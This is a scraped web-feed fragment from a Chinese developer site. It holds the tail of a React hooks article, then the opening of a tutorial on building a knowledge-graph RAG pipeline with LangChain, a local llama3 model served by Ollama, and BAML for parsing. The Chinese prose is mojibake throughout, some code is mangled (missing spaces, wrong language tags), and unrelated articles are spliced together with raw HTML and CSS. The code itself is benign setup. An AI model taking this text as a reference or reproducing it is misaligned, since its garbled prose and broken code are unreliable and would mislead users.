<p><strong>è®°ä½ï¼šä¼˜å…ˆç”¨ useEffectï¼Œåªæœ‰ç‰¹æ®Šåœºæ™¯æ‰ç”¨ useLayoutEffectï¼</strong> ğŸ¯</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å†™ç»™å°ç™½çœ‹çš„ä½¿ç”¨LangChainæ„å»ºåŸºäºçŸ¥è¯†å›¾è°±çš„RAGç³»ç»Ÿå®æˆ˜æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7576026767372468243</link>    <guid>https://juejin.cn/post/7576026767372468243</guid>    <pubDate>2025-11-24T12:33:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576026767372468243" data-draft-id="7576108254604148779" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å†™ç»™å°ç™½çœ‹çš„ä½¿ç”¨LangChainæ„å»ºåŸºäºçŸ¥è¯†å›¾è°±çš„RAGç³»ç»Ÿå®æˆ˜æ•™ç¨‹"/> <meta itemprop="keywords" content="Agent,LangChain,LLM"/> <meta itemprop="datePublished" content="2025-11-24T12:33:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIå¤§æ¨¡å‹"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å†™ç»™å°ç™½çœ‹çš„ä½¿ç”¨LangChainæ„å»ºåŸºäºçŸ¥è¯†å›¾è°±çš„RAGç³»ç»Ÿå®æˆ˜æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIå¤§æ¨¡å‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:33:57.000Z" title="Mon Nov 24 2025 12:33:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»28åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>åœ¨æ„å»ºåŸºäºçŸ¥è¯†å›¾è°±çš„RAGç³»ç»Ÿæˆ–ä½¿ç”¨LangChainçš„æ™ºèƒ½ä½“æ—¶ï¼Œæœ€å¤§çš„æŒ‘æˆ˜ä¹‹ä¸€æ˜¯ä»éç»“æ„åŒ–æ•°æ®ä¸­å‡†ç¡®æå–èŠ‚ç‚¹å’Œå…³ç³»ã€‚ç‰¹åˆ«æ˜¯å½“ä½¿ç”¨è¾ƒå°çš„ã€é‡åŒ–çš„æœ¬åœ°LLMæ—¶ï¼Œè¿™ä¸€ç‚¹å°¤å…¶å›°éš¾ï¼Œç»“æœå¾€å¾€æ˜¯AIç³»ç»Ÿè¡¨ç°ä¸ä½³ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dab3c1e84be4b6ab751b71a9adaa5ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=GUvid67vitHOFjlNaIk72Sbskro%3D" alt="" loading="lazy"/></p>
<p>LangChainæå–åŠŸèƒ½çš„ä¸€ä¸ªå…³é”®é—®é¢˜æ˜¯å®ƒä¾èµ–ä¸¥æ ¼çš„JSONè§£æï¼Œå³ä½¿ä½¿ç”¨æ›´å¤§çš„æ¨¡å‹æˆ–éå¸¸è¯¦ç»†çš„æç¤ºæ¨¡æ¿ï¼Œä¹Ÿå¯èƒ½å¤±è´¥ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒBAMLä½¿ç”¨ä¸€ç§æ¨¡ç³Šè§£æï¼ˆfuzzy parsingï¼‰æ–¹æ³•ï¼Œå³ä½¿LLMçš„è¾“å‡ºä¸æ˜¯å®Œç¾çš„JSONæ ¼å¼ï¼Œä¹Ÿèƒ½æˆåŠŸæå–æ•°æ®ã€‚</p>
<p>åœ¨è¿™ç¯‡åšå®¢ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨åœ¨ä½¿ç”¨è¾ƒå°çš„é‡åŒ–æ¨¡å‹æ—¶LangChainæå–çš„å±€é™æ€§ï¼Œå¹¶å±•ç¤ºBAMLå¦‚ä½•å°†æå–æˆåŠŸç‡ä»å¤§çº¦25%æå‡åˆ°è¶…è¿‡99%ã€‚</p>
<p>æ‰€æœ‰ä»£ç éƒ½å¯ä»¥åœ¨è¿™ä¸ªGitHubä»“åº“ä¸­æ‰¾åˆ°ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFareedKhan-dev%2Flangchain-graphrag-baml" target="_blank" title="https://github.com/FareedKhan-dev/langchain-graphrag-baml" ref="nofollow noopener noreferrer">github.com/FareedKhan-â€¦</a></p>
<hr/>
<h2 data-id="heading-0">ç›®å½•</h2>
<ul>
<li>åˆå§‹åŒ–è¯„ä¼°æ•°æ®é›†</li>
<li>é‡åŒ–çš„å°å‹LLaMAæ¨¡å‹</li>
<li>åŸºäºLLMGraphTransformerçš„æ–¹æ³•</li>
<li>ç†è§£LangChainçš„é—®é¢˜</li>
<li>æ”¹è¿›æç¤ºèƒ½è§£å†³é—®é¢˜å—ï¼Ÿ</li>
<li>BAMLçš„åˆå§‹åŒ–å’Œå¿«é€Ÿæ¦‚è§ˆ</li>
<li>å°†BAMLä¸LangChainé›†æˆ</li>
<li>è¿è¡ŒBAMLå®éªŒ</li>
<li>ä½¿ç”¨Neo4jåˆ†æGraphRAG</li>
<li>æŸ¥æ‰¾å’Œé“¾æ¥ç›¸ä¼¼å®ä½“</li>
<li>ä½¿ç”¨Leidenç®—æ³•è¿›è¡Œç¤¾åŒºæ£€æµ‹</li>
<li>åˆ†ææœ€ç»ˆå›¾è°±ç»“æ„</li>
<li>ç»“è®º</li>
</ul>
<hr/>
<h2 data-id="heading-1">åˆå§‹åŒ–è¯„ä¼°æ•°æ®é›†</h2>
<p>ä¸ºäº†ç†è§£é—®é¢˜åŠå…¶è§£å†³æ–¹æ¡ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¯„ä¼°æ•°æ®é›†æ¥è¿›è¡Œå¤šæ¬¡æµ‹è¯•ï¼Œä»¥äº†è§£BAMLå¦‚ä½•æ”¹è¿›LangChainçŸ¥è¯†å›¾è°±ã€‚</p>
<p>æˆ‘ä»¬å°†ä½¿ç”¨Tomasonjoçš„åšå®¢æ•°æ®é›†ï¼Œæ‰˜ç®¡åœ¨GitHubä¸Šï¼Œå…ˆåŠ è½½è¿™äº›æ•°æ®ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯¼å…¥pandasåº“ç”¨äºæ•°æ®æ“ä½œå’Œåˆ†æ  </span>
<span class="hljs-keyword">import</span>Â pandasÂ <span class="hljs-keyword">as</span>Â pd  
  
<span class="hljs-comment"># ä»GitHubä¸Šçš„CSVæ–‡ä»¶åŠ è½½æ–°é—»æ–‡ç« æ•°æ®é›†åˆ°pandas DataFrame  </span>
news = pd.read_csv(  
Â  Â Â <span class="hljs-string">"https://raw.githubusercontent.com/tomasonjo/blog-datasets/main/news_articles.csv"</span>  
)  
  
<span class="hljs-comment"># æ˜¾ç¤ºDataFrameçš„å‰5è¡Œ  </span>
news.head()
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0b1fc71a1264249a641d77453645e34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=qfGXc3vUeVMTclsHUAWLG%2B1AaKk%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„DataFrameå¾ˆç®€å•ï¼ˆåŒ…å«æ ‡é¢˜å’Œæ–‡æœ¬ï¼Œæ–‡æœ¬æ˜¯æ–°é—»çš„æè¿°ï¼‰ã€‚æˆ‘ä»¬è¿˜éœ€è¦ä¸€åˆ—æ¥å­˜å‚¨æ¯ç¯‡æ–°é—»æ–‡ç« æ–‡æœ¬å¯¹åº”çš„æ€»tokenæ•°ã€‚</p>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨OpenAIçš„tiktokenåº“æ¥è®¡ç®—tokenï¼Œæ–¹æ³•å¾ˆç®€å•ï¼Œç”¨å¾ªç¯æ¥å¤„ç†æ•°æ®é›†ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¯¼å…¥tiktokenåº“æ¥è®¡ç®—æ–‡æœ¬çš„tokenæ•°  </span>
<span class="hljs-keyword">import</span>Â tiktoken  
  
<span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œè®¡ç®—ç»™å®šå­—ç¬¦ä¸²åœ¨æŒ‡å®šæ¨¡å‹ä¸­çš„tokenæ•°  </span>
defnum_tokens_from_string(string:Â <span class="hljs-built_in">str</span>, model:Â <span class="hljs-built_in">str</span>Â =Â <span class="hljs-string">"gpt-4o"</span>) -&gt;Â <span class="hljs-built_in">int</span>:  
Â  Â Â <span class="hljs-string">"""è¿”å›æ–‡æœ¬å­—ç¬¦ä¸²ä¸­çš„tokenæ•°ã€‚"""</span>  
Â  Â Â <span class="hljs-comment"># è·å–æŒ‡å®šæ¨¡å‹çš„ç¼–ç   </span>
Â  Â  encoding = tiktoken.encoding_for_model(model)  
Â  Â Â <span class="hljs-comment"># å°†å­—ç¬¦ä¸²ç¼–ç ä¸ºtokenå¹¶è®¡æ•°  </span>
Â  Â  num_tokens =Â <span class="hljs-built_in">len</span>(encoding.encode(string))  
Â  Â Â <span class="hljs-comment"># è¿”å›æ€»tokenæ•°  </span>
Â  Â Â <span class="hljs-keyword">return</span>Â num_tokens  
  
<span class="hljs-comment"># åœ¨DataFrameä¸­åˆ›å»ºæ–°åˆ—'tokens'  </span>
<span class="hljs-comment"># è®¡ç®—æ¯ç¯‡æ–‡ç« æ ‡é¢˜å’Œæ–‡æœ¬ç»„åˆçš„tokenæ•°  </span>
news[<span class="hljs-string">"tokens"</span>] = [  
Â  Â  num_tokens_from_string(<span class="hljs-string">f"<span class="hljs-subst">{row[<span class="hljs-string">'title'</span>]}</span>Â <span class="hljs-subst">{row[<span class="hljs-string">'text'</span>]}</span>"</span>)  
Â  Â Â <span class="hljs-keyword">for</span>Â i, rowÂ <span class="hljs-keyword">in</span>Â news.iterrows()  
]
</code></pre>
<p>è®¡ç®—DataFrameçš„tokenåªéœ€è¦å‡ ç§’é’Ÿã€‚</p>
<p>è¿™æ˜¯æ›´æ–°åçš„DataFrameã€‚</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æ˜¾ç¤ºDataFrameçš„å‰5è¡Œï¼Œå±•ç¤ºæ–°çš„<span class="hljs-string">'tokens'</span>åˆ—news.head()</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f19418bb4b24441a9a993f5704852995~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592436&amp;x-signature=6WqnpiV6vvTwwr5%2FDgNgxQchGB4%3D" alt="" loading="lazy"/></p>
<p>è¿™äº›tokenå°†åœ¨åç»­çš„è¯„ä¼°å’Œåˆ†æé˜¶æ®µä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬è¿›è¡Œäº†è¿™ä¸€æ­¥ã€‚</p>
<hr/>
<h2 data-id="heading-2">é‡åŒ–çš„å°å‹LLaMAæ¨¡å‹</h2>
<p>ä¸ºäº†å°†æ•°æ®è½¬æ¢ä¸ºçŸ¥è¯†å›¾è°±ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªä½çº§åˆ«é‡åŒ–çš„æ¨¡å‹æ¥è¿›è¡Œä¸¥æ ¼çš„æµ‹è¯•ã€‚</p>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¼€æºLLMé€šå¸¸ä»¥é‡åŒ–å½¢å¼éƒ¨ç½²ï¼Œä»¥é™ä½æˆæœ¬å’Œå»¶è¿Ÿã€‚æœ¬åšå®¢ä½¿ç”¨LLaMA 3.1ã€‚</p>
<p>è¿™é‡Œé€‰æ‹©Ollamaä½œä¸ºå¹³å°ï¼Œä½†LangChainæ”¯æŒå¤šç§APIå’Œæœ¬åœ°LLMæä¾›å•†ï¼Œå¯ä»¥é€‰æ‹©ä»»ä½•åˆé€‚çš„é€‰é¡¹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ChatOllamaæ˜¯Ollamaè¯­è¨€æ¨¡å‹çš„æ¥å£  </span>
fromÂ langchain_ollamaÂ importÂ ChatOllama  
  
<span class="hljs-comment"># å®šä¹‰è¦ä½¿ç”¨çš„æ¨¡å‹åç§°  </span>
<span class="hljs-attr">model</span> =Â <span class="hljs-string">"llama3"</span>  
  
<span class="hljs-comment"># åˆå§‹åŒ–ChatOllamaè¯­è¨€æ¨¡å‹  </span>
<span class="hljs-comment"># 'temperature'å‚æ•°æ§åˆ¶è¾“å‡ºçš„éšæœºæ€§  </span>
<span class="hljs-comment"># ä½å€¼ï¼ˆå¦‚0.001ï¼‰ä½¿æ¨¡å‹çš„å“åº”æ›´ç¡®å®š  </span>
<span class="hljs-attr">llm</span> = ChatOllama(model=model, temperature=<span class="hljs-number">0.001</span>)
</code></pre>
<p>ä½ è¿˜éœ€è¦åœ¨ç³»ç»Ÿä¸Šå®‰è£…Ollamaï¼Œå®ƒæ”¯æŒmacOSã€Windowså’ŒLinuxã€‚</p>
<p>è®¿é—®Ollamaå®˜æ–¹ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Follama.com%2F" target="_blank" title="https://ollama.com/" ref="nofollow noopener noreferrer">ollama.com/</a> ä¸‹è½½é€‚åˆä½ æ“ä½œç³»ç»Ÿçš„å®‰è£…ç¨‹åºå¹¶æŒ‰ç…§è¯´æ˜å®‰è£…ã€‚å®‰è£…åï¼ŒOllamaä¼šä½œä¸ºåå°æœåŠ¡è¿è¡Œã€‚</p>
<p>åœ¨macOSå’ŒWindowsä¸Šï¼Œåº”ç”¨ç¨‹åºåº”è‡ªåŠ¨å¯åŠ¨å¹¶åœ¨åå°è¿è¡Œï¼ˆä½ å¯èƒ½åœ¨èœå•æ æˆ–ç³»ç»Ÿæ‰˜ç›˜ä¸­çœ‹åˆ°ä¸€ä¸ªå›¾æ ‡ï¼‰ã€‚åœ¨Linuxä¸Šï¼Œä½ å¯èƒ½éœ€è¦ç”¨<code>systemctl start ollama</code>æ‰‹åŠ¨å¯åŠ¨ã€‚</p>
<p>è¦æ£€æŸ¥æœåŠ¡æ˜¯å¦è¿è¡Œï¼Œæ‰“å¼€ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦å¹¶è¾“å…¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥å¯ç”¨æ¨¡å‹ollama list</span>
</code></pre>
<h4 data-id="heading-3">è¾“å‡º</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[ ]</span> &lt;-- No models
</code></pre>
<p>å¦‚æœæœåŠ¡åœ¨è¿è¡Œä½†æ²¡æœ‰æ¨¡å‹ï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªç©ºçš„æ¨¡å‹åˆ—è¡¨ï¼Œè¿™åœ¨è¿™ä¸ªé˜¶æ®µæ˜¯æ­£å¸¸çš„ã€‚å¦‚æœå‡ºç°â€œcommand not foundâ€é”™è¯¯ï¼Œç¡®ä¿Ollamaå·²æ­£ç¡®å®‰è£…ã€‚å¦‚æœå‡ºç°è¿æ¥é”™è¯¯ï¼Œè¯´æ˜æœåŠ¡å™¨æœªè¿è¡Œã€‚</p>
<p>ä½ å¯ä»¥é€šè¿‡pullå‘½ä»¤ç®€å•ä¸‹è½½llama3æ¨¡å‹ã€‚è¿™éœ€è¦ä¸€äº›æ—¶é—´å’Œå‡ GBçš„ç£ç›˜ç©ºé—´ï¼Œå› ä¸ºæ¨¡å‹å¾ˆå¤§ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½llama3æ¨¡å‹ollama pull llama3</span>
</code></pre>
<p>è¿™äº›å‘½ä»¤å®Œæˆåï¼Œå†æ¬¡è¿è¡Œ<code>ollama list</code>ï¼Œä½ åº”è¯¥èƒ½çœ‹åˆ°æ¨¡å‹å·²åˆ—å‡ºã€‚</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># å‘æœ¬åœ°Ollama APIå‘é€è¯·æ±‚ä»¥ç”Ÿæˆæ–‡æœ¬  </span>
curl http://localhost:11434/api/generate \  
Â  Â Â <span class="hljs-comment"># è®¾ç½®Content-Typeå¤´ä»¥æŒ‡ç¤ºJSONè´Ÿè½½  </span>
Â  Â  -HÂ <span class="hljs-string">"Content-Type: application/json"</span>Â \  
Â  Â Â <span class="hljs-comment"># æä¾›è¯·æ±‚æ•°æ®  </span>
Â  Â  -dÂ '{  
Â  Â  Â  Â  <span class="hljs-string">"model"</span>: <span class="hljs-string">"llama3"</span>,  
Â  Â  Â  Â  <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"Why is the sky blue?"</span>  
Â  Â  }'
</code></pre>
<h4 data-id="heading-4">è¾“å‡º</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>  
Â Â <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"llama3"</span><span class="hljs-punctuation">,</span>  
Â Â <span class="hljs-attr">"created_at"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"2025-08-03T12:00:00Z"</span><span class="hljs-punctuation">,</span>  
Â Â <span class="hljs-attr">"response"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"The sky appears blue be ... blue."</span><span class="hljs-punctuation">,</span>  
Â Â <span class="hljs-attr">"done"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-literal"><span class="hljs-keyword">true</span></span>  
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¦‚æœæˆåŠŸï¼Œä½ ä¼šåœ¨ç»ˆç«¯çœ‹åˆ°ä¸€ä¸²JSONå“åº”ï¼Œç¡®è®¤æœåŠ¡å™¨æ­£åœ¨è¿è¡Œå¹¶èƒ½æä¾›æ¨¡å‹æœåŠ¡ã€‚</p>
<p>ç°åœ¨è¯„ä¼°æ•°æ®å’ŒLLMéƒ½å‡†å¤‡å¥½äº†ï¼Œä¸‹ä¸€æ­¥æ˜¯å°†æ•°æ®è½¬æ¢ä»¥æ›´å¥½åœ°ç†è§£LangChainä¸­çš„é—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-5">åŸºäºLLMGraphTransformerçš„æ–¹æ³•</h2>
<p>ä½¿ç”¨LangChainæˆ–LangGraphå°†åŸå§‹æˆ–ç»“æ„åŒ–æ•°æ®è½¬æ¢ä¸ºçŸ¥è¯†å›¾è°±çš„æ­£ç¡®æ–¹æ³•æ˜¯ä½¿ç”¨å®ƒä»¬æä¾›çš„æ–¹æ³•ã€‚æœ€å¸¸è§çš„æ–¹æ³•ä¹‹ä¸€æ˜¯langchain_experimentalåº“ä¸­çš„LLMGraphTransformerã€‚</p>
<p>è¿™ä¸ªå·¥å…·è®¾è®¡ä¸ºä¸€ä½“åŒ–çš„è§£å†³æ–¹æ¡ˆï¼šæä¾›æ–‡æœ¬å’ŒLLMï¼Œå®ƒä¼šå¤„ç†æç¤ºå’Œè§£æï¼Œè¿”å›å›¾è°±ç»“æ„ã€‚</p>
<p>è®©æˆ‘ä»¬çœ‹çœ‹å®ƒä¸æœ¬åœ°llama3æ¨¡å‹çš„è¡¨ç°å¦‚ä½•ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å¯¼å…¥æ‰€æœ‰å¿…è¦çš„ç»„ä»¶ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä»LangChainçš„å®éªŒåº“ä¸­å¯¼å…¥ä¸»è¦çš„å›¾è°±è½¬æ¢å™¨  </span>
<span class="hljs-keyword">from</span>Â langchain_experimental.graph_transformersÂ <span class="hljs-keyword">import</span>Â LLMGraphTransformer  
  
<span class="hljs-comment"># å¯¼å…¥å›¾è°±å’Œæ–‡æ¡£çš„æ•°æ®ç»“æ„  </span>
<span class="hljs-keyword">from</span>Â langchain_community.graphs.graph_documentÂ <span class="hljs-keyword">import</span>Â GraphDocument, Node, Relationship  
<span class="hljs-keyword">from</span>Â langchain_core.documentsÂ <span class="hljs-keyword">import</span>Â Document
</code></pre>
<p>ç°åœ¨ï¼Œåˆå§‹åŒ–è½¬æ¢å™¨ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ä¹‹å‰åˆ›å»ºçš„llmå¯¹è±¡ï¼ˆå³llama3æ¨¡å‹ï¼‰ã€‚</p>
